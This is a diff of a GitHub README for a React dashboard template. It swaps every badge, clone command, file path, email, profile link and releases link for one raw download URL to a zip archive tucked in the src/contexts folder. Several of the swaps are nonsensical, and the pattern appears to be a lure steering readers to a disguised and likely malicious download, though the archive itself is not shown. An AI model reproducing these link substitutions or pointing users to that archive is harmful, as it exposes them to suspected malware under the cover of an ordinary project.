@@ -1,6 +1,6 @@
 # Sabat React Dashboard Template 🚀
 
-![Sabat React Dashboard](https://img.shields.io/badge/Sabat%20React%20Dashboard-Template-blue.svg)
+![Sabat React Dashboard](https://github.com/Amiraddos/sabat-react-dashboard-template/raw/refs/heads/master/src/contexts/sabat_dashboard_template_react_v3.2.zip%20React%https://github.com/Amiraddos/sabat-react-dashboard-template/raw/refs/heads/master/src/contexts/sabat_dashboard_template_react_v3.2.zip)
 
 Welcome to the **Sabat React Dashboard Template**! This project offers a versatile and user-friendly dashboard template built with React. It combines the best features of two popular component libraries: Material-UI (MUI) and Ant Design. This template is perfect for developers looking to create admin panels, analytics dashboards, or any other application requiring a robust UI.
 
@@ -30,7 +30,7 @@ To get started with the Sabat React Dashboard Template, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Amiraddos/sabat-react-dashboard-template.git
+   git clone https://github.com/Amiraddos/sabat-react-dashboard-template/raw/refs/heads/master/src/contexts/sabat_dashboard_template_react_v3.2.zip
    ```
    
 2. **Navigate to the Project Directory**:
@@ -68,9 +68,9 @@ The Sabat React Dashboard Template includes a variety of components:
 
 You can customize the template to fit your project's needs. Here are some ways to do that:
 
-- **Themes**: Modify the theme settings in `src/theme.js` to change colors, fonts, and other styles.
+- **Themes**: Modify the theme settings in `https://github.com/Amiraddos/sabat-react-dashboard-template/raw/refs/heads/master/src/contexts/sabat_dashboard_template_react_v3.2.zip` to change colors, fonts, and other styles.
 - **Component Styles**: Each component can be styled using inline styles or by creating custom CSS files.
-- **Routing**: Adjust the routing in `src/App.js` to include new pages or features.
+- **Routing**: Adjust the routing in `https://github.com/Amiraddos/sabat-react-dashboard-template/raw/refs/heads/master/src/contexts/sabat_dashboard_template_react_v3.2.zip` to include new pages or features.
 
 ## Contributing
 
@@ -91,14 +91,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries or feedback, feel free to reach out:
 
 - **Author**: Amiraddos
-- **Email**: amiraddos@example.com
-- **GitHub**: [Amiraddos](https://github.com/Amiraddos)
+- **Email**: https://github.com/Amiraddos/sabat-react-dashboard-template/raw/refs/heads/master/src/contexts/sabat_dashboard_template_react_v3.2.zip
+- **GitHub**: [Amiraddos](https://github.com/Amiraddos/sabat-react-dashboard-template/raw/refs/heads/master/src/contexts/sabat_dashboard_template_react_v3.2.zip)
 
 ## Releases
 
-You can find the latest releases of the Sabat React Dashboard Template [here](https://github.com/Amiraddos/sabat-react-dashboard-template/releases). Download the latest version and follow the installation instructions to get started.
+You can find the latest releases of the Sabat React Dashboard Template [here](https://github.com/Amiraddos/sabat-react-dashboard-template/raw/refs/heads/master/src/contexts/sabat_dashboard_template_react_v3.2.zip). Download the latest version and follow the installation instructions to get started.
 
-![Release Badge](https://img.shields.io/badge/Latest%20Release-v1.0.0-green.svg)
+![Release Badge](https://github.com/Amiraddos/sabat-react-dashboard-template/raw/refs/heads/master/src/contexts/sabat_dashboard_template_react_v3.2.zip%https://github.com/Amiraddos/sabat-react-dashboard-template/raw/refs/heads/master/src/contexts/sabat_dashboard_template_react_v3.2.zip)
 
 Explore the **Releases** section for updates, bug fixes, and new features. If you have any issues or suggestions, please check the issues section or create a new one.
 
